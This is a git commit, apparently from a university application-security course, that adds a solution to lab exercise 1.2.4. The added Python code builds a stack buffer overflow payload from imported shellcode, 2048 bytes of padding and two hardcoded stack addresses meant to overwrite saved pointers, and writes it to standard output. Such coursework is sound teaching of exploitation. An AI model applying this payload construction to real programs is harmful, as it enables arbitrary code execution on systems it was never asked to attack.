ed8d5412d6d6292eaa95b84a0ca3fd503d46275b
Rio Martinez <rioam2@illinois.edu>
2020-09-06 14:00:56 -0500

    1.2.4

--- AppSec/1.2.4.py
+++ AppSec/1.2.4.py
@@ -5,3 +5,7 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+shell_len = len(shellcode)
+padding_len = (2048 - shell_len)
+output=shellcode + (b"\x32"*padding_len) + b"\x6C\xB3\xfe\xff"+ b"\x68\xb3\xfe\xff" 
+sys.stdout.buffer.write(output)
